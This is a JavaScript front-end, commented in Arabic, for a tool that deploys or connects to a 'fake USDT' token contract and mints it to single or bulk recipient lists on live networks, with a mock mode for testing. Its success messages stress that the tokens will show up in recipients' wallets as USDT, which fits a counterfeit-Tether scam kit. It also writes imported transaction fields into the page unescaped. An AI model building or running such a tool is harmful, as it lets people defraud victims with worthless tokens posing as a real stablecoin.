            // محاولة تقدير الغاز المطلوب
            try {
                const estimatedGas = await fakeUSDTContract.estimateGas.mint(recipient, tokenAmountWei);
                console.log("الغاز المقدر لإرسال التوكنات:", estimatedGas.toString());

                // استخدام الغاز المقدر + هامش أمان كبير (50%)
                const calculatedGasLimit = estimatedGas.mul(150).div(100);
                console.log("حد الغاز المحسوب (بعد التقدير):", calculatedGasLimit.toString());

                // استخدام القيمة الأكبر بين حد الغاز المحسوب والقيمة الافتراضية
                if (calculatedGasLimit.gt(ethers.BigNumber.from(gasLimit))) {
                    gasLimit = calculatedGasLimit;
                    console.log("استخدام حد الغاز المحسوب لأنه أكبر:", gasLimit.toString());
                }
            } catch (error) {
                console.log("فشل تقدير الغاز:", error.message);
                // الاستمرار باستخدام القيمة الافتراضية
            }

            // تحديث واجهة المستخدم
            updateSendResult(`
                <div>جاري إرسال ${amount} USDT إلى ${formatAddress(recipient)}...</div>
                <div>الشبكة: ${contractNetworkInfo.chainName}</div>
                <div>سعر الغاز: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei</div>
                <div>حد الغاز: ${gasLimit.toString()}</div>
                <div class="warning">يرجى الموافقة على المعاملة في محفظتك...</div>
            `);

            // إنشاء خيارات المعاملة
            const txOptions = {
                gasPrice: gasPrice,
                gasLimit: gasLimit,
                nonce: await provider.getTransactionCount(await signer.getAddress(), "latest")
            };

            console.log("خيارات المعاملة:", txOptions);

            // إرسال المعاملة مع إعدادات محسنة
            tx = await fakeUSDTContract.mint(recipient, tokenAmountWei, txOptions);

            updateSendResult(`
                <div>تم إرسال المعاملة، جاري انتظار التأكيد...</div>
                <div>رقم المعاملة: ${tx.hash}</div>
                <div class="warning">يرجى الانتظار حتى يتم تأكيد المعاملة...</div>
            `);

            // انتظار اكتمال المعاملة
            receipt = await tx.wait();

            // الحصول على رابط المسح الضوئي للمعاملة
            txExplorerUrl = networkInfo.blockExplorerUrls[0] + '/tx/' + receipt.transactionHash;
        }

        // إضافة المعاملة إلى السجل
        addTransaction({
            hash: receipt.transactionHash,
            recipient: recipient,
            amount: amount,
            network: isMockMode ? (contractNetworkInfo.chainName + " (محاكاة)") : contractNetworkInfo.chainName,
            explorerUrl: isMockMode ? null : txExplorerUrl,
            timestamp: new Date().toLocaleString(),
            isMock: isMockMode
        });

        // تحديث النتيجة
        if (isMockMode) {
            // رسالة نجاح للمحاكاة
            updateSendResult(`
                <div class="success">تم إرسال ${amount} USDT بنجاح! (محاكاة)</div>
                <div><strong>المستلم:</strong> ${formatAddress(recipient)}</div>
                <div><strong>الشبكة:</strong> ${contractNetworkInfo.chainName} (محاكاة)</div>
                <div class="info" style="margin-top: 10px;">
                    <strong>ملاحظة هامة:</strong> هذه معاملة محاكاة فقط. لم يتم إرسال توكنات حقيقية.
                    <br>في الاستخدام الفعلي، ستظهر التوكنات في محفظة المستلم كتوكنات USDT.
                </div>
            `, 'success');
        } else {
            // رسالة نجاح للمعاملة الفعلية
            updateSendResult(`
                <div class="success">تم إرسال ${amount} USDT بنجاح!</div>
                <div><strong>المستلم:</strong> ${formatAddress(recipient)}</div>
                <div><strong>الشبكة:</strong> ${contractNetworkInfo.chainName}</div>
                <div><a href="${txExplorerUrl}" target="_blank" class="explorer-link">عرض المعاملة في المسح الضوئي</a></div>
                <div class="info" style="margin-top: 10px;">
                    <strong>ملاحظة هامة:</strong> ستظهر التوكنات في محفظة المستلم كتوكنات USDT. قد يحتاج المستلم إلى إضافة التوكن يدوياً باستخدام عنوان العقد: <span dir="ltr">${fakeUSDTAddress}</span>
                </div>
            `, 'success');
        }

        // إعادة تفعيل الزر
        sendBtn.disabled = false;

    } catch (error) {
        console.error(error);
        let errorMessage = error.message;

        // تحسين رسائل الخطأ
        if (error.message.includes('Internal JSON-RPC error')) {
            // استخراج رسالة الخطأ الداخلية إذا كانت موجودة
            const match = error.message.match(/"message":"([^"]+)"/);
            if (match && match[1]) {
                errorMessage = match[1];
            }

            // إضافة نصائح إضافية
            errorMessage += '<br><br>نصائح للإصلاح:<br>' +
                `1. تأكد من وجود رصيد كافٍ من ${networkInfo?.nativeCurrency?.symbol || 'العملة الأصلية'} في محفظتك لدفع رسوم المعاملة.<br>` +
                '2. حاول استخدام شبكة اختبار مثل BSC Testnet أو Sepolia للتجربة أولاً.<br>' +
                '3. تأكد من أنك وافقت على إضافة الشبكة في محفظتك.';
        } else if (error.code === 4001) {
            // المستخدم رفض المعاملة
            errorMessage = 'تم رفض المعاملة من قبل المستخدم. يرجى الموافقة على المعاملة في محفظتك للمتابعة.';
        }

        updateSendResult(`<div class="error">خطأ في إرسال التوكنات: ${errorMessage}</div>`, 'error');
        sendBtn.disabled = false;
    }
}

// دالة تحديث نتيجة النشر
function updateDeployResult(message, type = '') {
    deployResult.innerHTML = message;
    deployResult.className = `result-box ${type}`;
}

// دالة تحديث نتيجة الإرسال
function updateSendResult(message, type = '') {
    sendResult.innerHTML = message;
    sendResult.className = `result-box ${type}`;
}

// دالة إضافة معاملة إلى السجل
function addTransaction(transaction) {
    // إضافة المعاملة في بداية المصفوفة
    transactions.unshift(transaction);

    // تحديث قائمة المعاملات في واجهة المستخدم
    updateTransactionsList();

    // حفظ المعاملات في التخزين المحلي
    try {
        localStorage.setItem('fakeUSDT_transactions', JSON.stringify(transactions));
    } catch (error) {
        console.error('Error saving transactions to localStorage:', error);
    }

    // إظهار إشعار للمستخدم
    const isMockMode = transaction.network && transaction.network.includes("محاكاة");
    if (isMockMode) {
        // إظهار إشعار بأن هذه معاملة محاكاة
        console.log(`تمت إضافة معاملة محاكاة: ${transaction.amount} USDT إلى ${formatAddress(transaction.recipient)}`);
    } else {
        // إظهار إشعار بأن هذه معاملة حقيقية
        console.log(`تمت إضافة معاملة حقيقية: ${transaction.amount} USDT إلى ${formatAddress(transaction.recipient)}`);
    }
}

// دالة تحديث قائمة المعاملات
function updateTransactionsList() {
    if (transactions.length === 0) {
        transactionsList.innerHTML = '<p>لا توجد معاملات حتى الآن</p>';
        return;
    }

    let html = '';
    transactions.forEach(tx => {
        // تحديد ما إذا كانت معاملة محاكاة
        const isMockMode = tx.network && tx.network.includes("محاكاة");

        // تحديد لون خلفية المعاملة
        const bgClass = isMockMode ? 'transaction-mock' : 'transaction-real';

        html += `
            <div class="transaction-item ${bgClass}">
                <div class="transaction-header">
                    <span class="transaction-network">${tx.network || 'غير معروفة'}</span>
                    <span class="transaction-time">${tx.timestamp}</span>
                </div>
                <div class="transaction-body">
                    <div><strong>المستلم:</strong> ${formatAddress(tx.recipient)}</div>
                    <div><strong>المبلغ:</strong> ${tx.amount} USDT</div>
                    <div><strong>رقم المعاملة:</strong> <span dir="ltr" class="transaction-hash">${tx.hash.substring(0, 10)}...${tx.hash.substring(tx.hash.length - 8)}</span></div>
                    ${tx.note ? `<div class="transaction-note"><strong>ملاحظة:</strong> ${tx.note}</div>` : ''}
                    ${tx.explorerUrl ? `<div><a href="${tx.explorerUrl}" target="_blank" class="explorer-link">عرض المعاملة في المسح الضوئي</a></div>` : ''}
                </div>
                ${isMockMode ? '<div class="mock-badge">محاكاة</div>' : ''}
            </div>
        `;
    });

    transactionsList.innerHTML = html;

    // إضافة أنماط CSS للمعاملات
    if (!document.getElementById('transaction-styles')) {
        const style = document.createElement('style');
        style.id = 'transaction-styles';
        style.textContent = `
            .transaction-item {
                position: relative;
                margin-bottom: 15px;
                padding: 12px;
                border-radius: 8px;
                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            }
            .transaction-mock {
                background-color: #f8f9fa;
                border-left: 4px solid #6c757d;
            }
            .transaction-real {
                background-color: #f0f8ff;
                border-left: 4px solid #007bff;
            }
            .transaction-header {
                display: flex;
                justify-content: space-between;
                margin-bottom: 8px;
                font-size: 0.9em;
                color: #6c757d;
            }
            .transaction-body {
                line-height: 1.5;
            }
            .transaction-hash {
                font-family: monospace;
                background: #f1f1f1;
                padding: 2px 4px;
                border-radius: 3px;
            }
            .transaction-note {
                margin-top: 5px;
                font-style: italic;
                color: #6c757d;
            }
            .mock-badge {
                position: absolute;
                top: 10px;
                right: 10px;
                background: #6c757d;
                color: white;
                padding: 2px 8px;
                border-radius: 10px;
                font-size: 0.8em;
            }
            .explorer-link {
                display: inline-block;
                margin-top: 8px;
                color: #007bff;
                text-decoration: none;
            }
            .explorer-link:hover {
                text-decoration: underline;
            }
        `;
        document.head.appendChild(style);
    }
}

// دالة تصدير المعاملات
function exportTransactions() {
    if (transactions.length === 0) {
        alert('لا توجد معاملات للتصدير');
        return;
    }

    const dataStr = JSON.stringify(transactions, null, 2);
    const dataUri = 'data:application/json;charset=utf-8,' + encodeURIComponent(dataStr);

    const exportFileDefaultName = `fake_usdt_transactions_${new Date().toISOString().slice(0, 10)}.json`;

    const linkElement = document.createElement('a');
    linkElement.setAttribute('href', dataUri);
    linkElement.setAttribute('download', exportFileDefaultName);
    linkElement.click();
}

// دالة استيراد المعاملات
function importTransactionsClick() {
    importFile.click();
}

// دالة معالجة ملف الاستيراد
function handleImportFile(event) {
    const file = event.target.files[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = function(e) {
        try {
            const importedTransactions = JSON.parse(e.target.result);

            if (Array.isArray(importedTransactions)) {
                // دمج المعاملات المستوردة مع المعاملات الحالية
                const mergedTransactions = [...importedTransactions, ...transactions];

                // إزالة التكرارات باستخدام معرف المعاملة
                const uniqueTransactions = [];
                const txHashes = new Set();

                mergedTransactions.forEach(tx => {
                    if (!txHashes.has(tx.hash)) {
                        txHashes.add(tx.hash);
                        uniqueTransactions.push(tx);
                    }
                });

                // ترتيب المعاملات حسب التاريخ (الأحدث أولاً)
                uniqueTransactions.sort((a, b) => {
                    return new Date(b.timestamp) - new Date(a.timestamp);
                });

                transactions = uniqueTransactions;
                updateTransactionsList();

                // حفظ المعاملات في التخزين المحلي
                localStorage.setItem('fakeUSDT_transactions', JSON.stringify(transactions));

                alert(`تم استيراد ${importedTransactions.length} معاملة بنجاح`);
            } else {
                alert('الملف المستورد ليس بالتنسيق الصحيح');
            }
        } catch (error) {
            console.error('Error importing transactions:', error);
            alert('حدث خطأ أثناء استيراد المعاملات');
        }

        // إعادة تعيين حقل الملف
        importFile.value = '';
    };

    reader.readAsText(file);
}

// دالة مسح المعاملات
function clearTransactions() {
    if (transactions.length === 0) {
        alert('لا توجد معاملات للمسح');
        return;
    }

    if (confirm('هل أنت متأكد من رغبتك في مسح جميع المعاملات؟')) {
        transactions = [];
        updateTransactionsList();
        localStorage.removeItem('fakeUSDT_transactions');
        alert('تم مسح جميع المعاملات بنجاح');
    }
}

// دالة تجاوز نشر العقد (للاختبار فقط)
async function skipDeploy() {
    try {
        updateDeployResult('جاري التحضير لتجاوز نشر العقد...');

        if (!window.ethereum) {
            updateDeployResult(`خطأ: لم يتم العثور على محفظة متصلة. يرجى الاتصال بمحفظة أولاً.`, 'error');
            return;
        }

        // التحقق من الشبكة المحددة في واجهة المستخدم
        const selectedNetworkId = networkSelect.value;
        const selectedNetworkInfo = NETWORKS[selectedNetworkId];

        if (!selectedNetworkInfo) {
            updateDeployResult(`خطأ: الشبكة المحددة غير مدعومة (${selectedNetworkId})`, 'error');
            return;
        }

        // إعادة تهيئة المزود للتأكد من استخدام أحدث حالة للشبكة
        provider = new ethers.providers.Web3Provider(window.ethereum);

        // الحصول على معلومات الشبكة الحالية
        const network = await provider.getNetwork();
        const currentNetworkInfo = getNetworkInfoByChainId(network.chainId);

        // التحقق مما إذا كانت الشبكة الحالية هي نفس الشبكة المحددة
        if (!currentNetworkInfo || currentNetworkInfo.id !== selectedNetworkId) {
            updateDeployResult(`
                <div>الشبكة الحالية (${currentNetworkInfo ? currentNetworkInfo.chainName : network.name}) مختلفة عن الشبكة المحددة (${selectedNetworkInfo.chainName}).</div>
                <div>جاري محاولة التبديل إلى الشبكة المحددة...</div>
            `, 'warning');

            // محاولة التبديل إلى الشبكة المحددة
            const switchSuccess = await switchNetwork(selectedNetworkId);

            if (!switchSuccess) {
                updateDeployResult(`
                    <div class="error">فشل التبديل إلى الشبكة المحددة (${selectedNetworkInfo.chainName}).</div>
                    <div>يرجى التبديل يدويًا إلى الشبكة المطلوبة في محفظتك ثم المحاولة مرة أخرى.</div>
                `, 'error');
                return;
            }

            // إعادة تهيئة المزود بعد تغيير الشبكة
            provider = new ethers.providers.Web3Provider(window.ethereum);
        }

        // الحصول على الموقع بعد التأكد من الشبكة
        signer = provider.getSigner();

        // إنشاء عنوان وهمي للعقد - استخدام عنوان مختلف عن الصفر لتجنب المشاكل
        fakeUSDTAddress = "0xDEADBEEF00000000000000000000000000000000";

        // إنشاء كائن عقد وهمي مع وظائف محاكاة
        const mockContract = {
            mint: async (to, amount) => {
                console.log(`محاكاة إرسال ${ethers.utils.formatUnits(amount, 6)} USDT إلى ${to}`);

                // إضافة تأخير صغير لمحاكاة وقت المعاملة
                await new Promise(resolve => setTimeout(resolve, 500));

                // محاكاة نجاح المعاملة
                return {
                    wait: async () => {
                        // إضافة تأخير صغير لمحاكاة وقت تأكيد المعاملة
                        await new Promise(resolve => setTimeout(resolve, 500));

                        return {
                            transactionHash: "0x" + Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('')
                        };
                    }
                };
            },
            symbol: async () => "USDT",
            name: async () => "Tether USD (Mock)",
            decimals: async () => 6,
            balanceOf: async (address) => ethers.utils.parseUnits("1000000", 6) // رصيد وهمي كبير
        };

        // تعيين العقد الوهمي
        fakeUSDTContract = mockContract;

        // إضافة معاملة وهمية إلى السجل لإظهار أن وضع المحاكاة يعمل
        const demoTxHash = "0x" + Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');

        // الحصول على عنوان المحفظة الحالية
        const userAddress = await signer.getAddress();

        // إضافة معاملة وهمية للتوضيح
        addTransaction({
            hash: demoTxHash,
            recipient: userAddress,
            amount: "1000",
            network: selectedNetworkInfo.chainName + " (محاكاة)",
            explorerUrl: null,
            timestamp: new Date().toLocaleString(),
            note: "معاملة توضيحية لوضع المحاكاة"
        });

        // تحديث النتيجة
        updateDeployResult(`
            <div class="success">تم تفعيل وضع المحاكاة بنجاح!</div>
            <div>الشبكة الحالية: ${selectedNetworkInfo.chainName}</div>
            <div>العملة الأصلية: ${selectedNetworkInfo.nativeCurrency.symbol}</div>
            <div class="warning">ملاحظة: هذا للاختبار فقط. لن تظهر التوكنات في محفظتك الحقيقية.</div>
            <div>تم إضافة معاملة توضيحية إلى سجل المعاملات.</div>
            <div>يمكنك الآن إرسال توكنات وهمية إلى أي عنوان.</div>
        `, 'success');

        // تفعيل أزرار الإرسال
        sendBtn.disabled = false;
        multiSendBtn.disabled = false;

    } catch (error) {
        console.error(error);
        updateDeployResult(`خطأ في تجاوز نشر العقد: ${error.message}`, 'error');
    }
}

// تعديل دالة إرسال التوكنات للتعامل مع وضع المحاكاة
async function sendTokensWithSimulation() {
    const recipient = recipientAddress.value.trim();
    const amount = tokenAmount.value.trim();

    // التحقق من صحة المدخلات
    if (!recipient || !ethers.utils.isAddress(recipient)) {
        updateSendResult('خطأ: يرجى إدخال عنوان محفظة صحيح', 'error');
        return;
    }

    if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
        updateSendResult('خطأ: يرجى إدخال مبلغ صحيح', 'error');
        return;
    }

    try {
        updateSendResult('جاري إرسال التوكنات...');
        sendBtn.disabled = true;

        // التحقق من وجود العقد
        if (!fakeUSDTContract) {
            updateSendResult('خطأ: يرجى نشر العقد أو تجاوز النشر أولاً', 'error');
            sendBtn.disabled = false;
            return;
        }

        // الحصول على معلومات الشبكة الحالية
        const network = await provider.getNetwork();
        const networkInfo = getNetworkInfoByChainId(network.chainId);

        if (!networkInfo) {
            updateSendResult(`خطأ: الشبكة الحالية غير مدعومة (${network.name})`, 'error');
            sendBtn.disabled = false;
            return;
        }

        // تحويل المبلغ إلى وحدات التوكن (6 كسور عشرية)
        const tokenAmountWei = ethers.utils.parseUnits(amount, 6);

        // التحقق مما إذا كنا في وضع المحاكاة
        const isMockMode = fakeUSDTAddress.startsWith("0xDEADBEEF");

        if (isMockMode) {
            try {
                // استدعاء دالة mint المحاكاة
                const tx = await fakeUSDTContract.mint(recipient, tokenAmountWei);
                const receipt = await tx.wait();

                // إضافة المعاملة إلى السجل
                addTransaction({
                    hash: receipt.transactionHash,
                    recipient: recipient,
                    amount: amount,
                    network: networkInfo.name + " (محاكاة)",
                    explorerUrl: null,
                    timestamp: new Date().toLocaleString()
                });

                // تحديث النتيجة
                updateSendResult(`
                    <div class="success">تمت محاكاة إرسال ${amount} USDT بنجاح!</div>
                    <div>المستلم: ${formatAddress(recipient)}</div>
                    <div>الشبكة: ${networkInfo.name} (محاكاة)</div>
                    <div class="warning">ملاحظة: هذه محاكاة فقط وليست معاملة حقيقية.</div>
                `, 'success');
            } catch (error) {
                console.error("خطأ في المحاكاة:", error);
                updateSendResult(`خطأ في محاكاة إرسال التوكنات: ${error.message}`, 'error');
            }
        } else {
            // استخدام الدالة الأصلية للإرسال الحقيقي
            await sendTokens();
        }
    } catch (error) {
        console.error(error);
        updateSendResult(`خطأ في إرسال التوكنات: ${error.message}`, 'error');
    } finally {
        // إعادة تفعيل الزر
        sendBtn.disabled = false;
    }
}

// دالة إرسال التوكنات لعدة عناوين
async function sendToMultipleAddresses() {
    const addresses = multiRecipients.value.trim().split('\n').filter(addr => addr.trim() !== '');
    const amount = multiAmount.value.trim();

    // التحقق من صحة المدخلات
    if (addresses.length === 0) {
        updateSendResult('خطأ: يرجى إدخال عنوان واحد على الأقل', 'error');
        return;
    }

    // التحقق من صحة العناوين
    const invalidAddresses = addresses.filter(addr => !ethers.utils.isAddress(addr.trim()));
    if (invalidAddresses.length > 0) {
        updateSendResult(`خطأ: العناوين التالية غير صالحة: ${invalidAddresses.join(', ')}`, 'error');
        return;
    }

    if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
        updateSendResult('خطأ: يرجى إدخال مبلغ صحيح', 'error');
        return;
    }

    try {
        updateSendResult(`جاري إرسال ${amount} USDT إلى ${addresses.length} عنوان...`);
        multiSendBtn.disabled = true;

        // التحقق من وجود العقد
        if (!fakeUSDTContract) {
            updateSendResult('خطأ: يرجى نشر العقد أو تجاوز النشر أولاً', 'error');
            multiSendBtn.disabled = false;
            return;
        }

        // الحصول على معلومات الشبكة الحالية
        const network = await provider.getNetwork();
        const networkInfo = getNetworkInfoByChainId(network.chainId);

        if (!networkInfo) {
            updateSendResult(`خطأ: الشبكة الحالية غير مدعومة (${network.name})`, 'error');
            multiSendBtn.disabled = false;
            return;
        }

        // تحويل المبلغ إلى وحدات التوكن (6 كسور عشرية)
        const tokenAmountWei = ethers.utils.parseUnits(amount, 6);

        // التحقق مما إذا كنا في وضع المحاكاة
        const isMockMode = fakeUSDTAddress.startsWith("0xDEADBEEF");

        if (isMockMode) {
            let successCount = 0;

            // محاكاة إرسال لكل عنوان
            for (const recipient of addresses) {
                try {
                    // استدعاء دالة mint المحاكاة
                    const tx = await fakeUSDTContract.mint(recipient.trim(), tokenAmountWei);
                    const receipt = await tx.wait();

                    // إضافة المعاملة إلى السجل
                    addTransaction({
                        hash: receipt.transactionHash,
                        recipient: recipient.trim(),
                        amount: amount,
                        network: networkInfo.name + " (محاكاة)",
                        explorerUrl: null,
                        timestamp: new Date().toLocaleString()
                    });

                    successCount++;
                } catch (error) {
                    console.error(`خطأ في محاكاة الإرسال إلى ${recipient}:`, error);
                }
            }

            // تحديث النتيجة
            updateSendResult(`
                <div class="success">تمت محاكاة إرسال ${amount} USDT بنجاح إلى ${successCount} عنوان!</div>
                <div>الشبكة: ${networkInfo.name} (محاكاة)</div>
                <div class="warning">ملاحظة: هذه محاكاة فقط وليست معاملات حقيقية.</div>
                <div>يمكنك مشاهدة تفاصيل المعاملات في سجل المعاملات.</div>
            `, 'success');

            return;
        }

        // إذا لم يكن في وضع المحاكاة، قم بإرسال المعاملات الحقيقية
        let successCount = 0;
        let failCount = 0;

        for (const recipient of addresses) {
            try {
                // إرسال التوكنات مع تحديد سعر الغاز وحد الغاز
                const tx = await fakeUSDTContract.mint(recipient.trim(), tokenAmountWei, {
                    gasPrice: networkInfo.gasPrice,
                    gasLimit: 1000000 // تحديد حد الغاز بشكل صريح
                });

                // انتظار اكتمال المعاملة
                const receipt = await tx.wait();

                // الحصول على رابط المسح الضوئي للمعاملة
                const txExplorerUrl = networkInfo.blockExplorerUrls[0] + '/tx/' + receipt.transactionHash;

                // إضافة المعاملة إلى السجل
                addTransaction({
                    hash: receipt.transactionHash,
                    recipient: recipient.trim(),
                    amount: amount,
                    network: networkInfo.name,
                    explorerUrl: txExplorerUrl,
                    timestamp: new Date().toLocaleString()
                });

                successCount++;
            } catch (error) {
                console.error(`خطأ في الإرسال إلى ${recipient}:`, error);
                failCount++;
            }
        }

        // تحديث النتيجة
        if (successCount > 0) {
            updateSendResult(`
                <div class="success">تم إرسال ${amount} USDT بنجاح إلى ${successCount} عنوان!</div>
                ${failCount > 0 ? `<div>فشل الإرسال إلى ${failCount} عنوان.</div>` : ''}
                <div>الشبكة: ${networkInfo.name}</div>
                <div>يمكنك مشاهدة تفاصيل المعاملات في سجل المعاملات.</div>
            `, 'success');
        } else {
            updateSendResult(`
                <div class="error">فشل إرسال التوكنات إلى جميع العناوين.</div>
                <div>يرجى التحقق من رصيد العملة الأصلية الخاص بك وحاول مرة أخرى.</div>
            `, 'error');
        }

    } catch (error) {
        console.error(error);
        let errorMessage = error.message;

        // تحسين رسائل الخطأ
        if (error.message.includes('Internal JSON-RPC error')) {
            // استخراج رسالة الخطأ الداخلية إذا كانت موجودة
            const match = error.message.match(/"message":"([^"]+)"/);
            if (match && match[1]) {
                errorMessage = match[1];
            }

            // إضافة نصائح إضافية
            errorMessage += '<br><br>نصائح للإصلاح:<br>' +
                '1. تأكد من وجود رصيد كافٍ من العملة الأصلية في محفظتك لدفع رسوم المعاملة.<br>' +
                '2. حاول استخدام شبكة اختبار مثل BSC Testnet للتجربة أولاً.<br>' +
                '3. تأكد من أنك وافقت على إضافة الشبكة في محفظتك.';
        }

        updateSendResult(`خطأ في إرسال التوكنات: ${errorMessage}`, 'error');
    } finally {
        multiSendBtn.disabled = false;
    }
}

// دالة تبديل التبويبات
function switchTab(tabId, tabType) {
    if (tabType === 'send') {
        // إزالة الفئة النشطة من جميع تبويبات الإرسال
        singleTab.classList.remove('active');
        multiTab.classList.remove('active');
        singleForm.classList.remove('active');
        multiForm.classList.remove('active');

        // إضافة الفئة النشطة للتبويب المحدد
        if (tabId === 'single') {
            singleTab.classList.add('active');
            singleForm.classList.add('active');
        } else {
            multiTab.classList.add('active');
            multiForm.classList.add('active');
        }
    } else if (tabType === 'deploy') {
        // إزالة الفئة النشطة من جميع تبويبات النشر
        deployTab.classList.remove('active');
        connectTab.classList.remove('active');
        deployForm.classList.remove('active');
        connectForm.classList.remove('active');

        // إضافة الفئة النشطة للتبويب المحدد
        if (tabId === 'deploy') {
            deployTab.classList.add('active');
            deployForm.classList.add('active');
        } else {
            connectTab.classList.add('active');
            connectForm.classList.add('active');
        }
    }
}

// دالة الاتصال بعقد موجود
async function connectToContract() {
    const address = contractAddress.value.trim();

    // التحقق من صحة العنوان
    if (!address || !ethers.utils.isAddress(address)) {
        updateDeployResult('خطأ: يرجى إدخال عنوان عقد صحيح', 'error');
        return;
    }

    try {
        updateDeployResult('جاري الاتصال بالعقد...');
        connectBtn.disabled = true;

        // إعادة تهيئة المزود للتأكد من استخدام أحدث حالة للشبكة
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();

        // الحصول على معلومات الشبكة الحالية
        const network = await provider.getNetwork();
        const networkInfo = getNetworkInfoByChainId(network.chainId);

        if (!networkInfo) {
            updateDeployResult(`خطأ: الشبكة الحالية غير مدعومة (${network.name})`, 'error');
            connectBtn.disabled = false;
            return;
        }

        // إنشاء كائن العقد
        fakeUSDTContract = new ethers.Contract(address, fakeUSDTAbi, signer);
        fakeUSDTAddress = address;

        // محاولة استدعاء دالة من العقد للتحقق من صحته
        try {
            const symbol = await fakeUSDTContract.symbol();
            const name = await fakeUSDTContract.name();

            // الحصول على رابط المسح الضوئي للعقد
            const explorerUrl = networkInfo.blockExplorerUrls[0] + '/address/' + fakeUSDTAddress;

            // تحديث النتيجة
            updateDeployResult(`
                تم الاتصال بالعقد بنجاح!<br>
                اسم العقد: ${name}<br>
                الرمز: ${symbol}<br>
                عنوان العقد: <span dir="ltr">${fakeUSDTAddress}</span><br>
                الشبكة: ${networkInfo.chainName}<br>
                <a href="${explorerUrl}" target="_blank" class="explorer-link">عرض العقد في المسح الضوئي</a>
            `, 'success');

            // تفعيل زر الإرسال
            sendBtn.disabled = false;
            multiSendBtn.disabled = false;

        } catch (error) {
            console.error('Error verifying contract:', error);
            updateDeployResult(`
                تم الاتصال بالعنوان، ولكن يبدو أنه ليس عقد USDT متوافق.<br>
                تأكد من أن العنوان صحيح وأنه يمثل عقد USDT.
            `, 'error');
            fakeUSDTContract = null;
            fakeUSDTAddress = null;
        }

    } catch (error) {
        console.error(error);
        updateDeployResult(`خطأ في الاتصال بالعقد: ${error.message}`, 'error');
    } finally {
        connectBtn.disabled = false;
    }
}

// إضافة مستمعي الأحداث
deployBtn.addEventListener('click', deployContract);
skipDeployBtn.addEventListener('click', skipDeploy);
connectBtn.addEventListener('click', connectToContract);
sendBtn.addEventListener('click', sendTokensWithSimulation);
multiSendBtn.addEventListener('click', sendToMultipleAddresses);
singleTab.addEventListener('click', () => switchTab('single', 'send'));
multiTab.addEventListener('click', () => switchTab('multi', 'send'));
deployTab.addEventListener('click', () => switchTab('deploy', 'deploy'));
connectTab.addEventListener('click', () => switchTab('connect', 'deploy'));
exportBtn.addEventListener('click', exportTransactions);
importBtn.addEventListener('click', importTransactionsClick);
clearBtn.addEventListener('click', clearTransactions);
importFile.addEventListener('change', handleImportFile);

// إضافة مستمع الحدث لزر تغيير المحفظة
document.getElementById('change-wallet-btn').addEventListener('click', changeWallet);

// تحديث قائمة المعاملات عند بدء التطبيق
updateTransactionsList();

// بدء التطبيق
init();
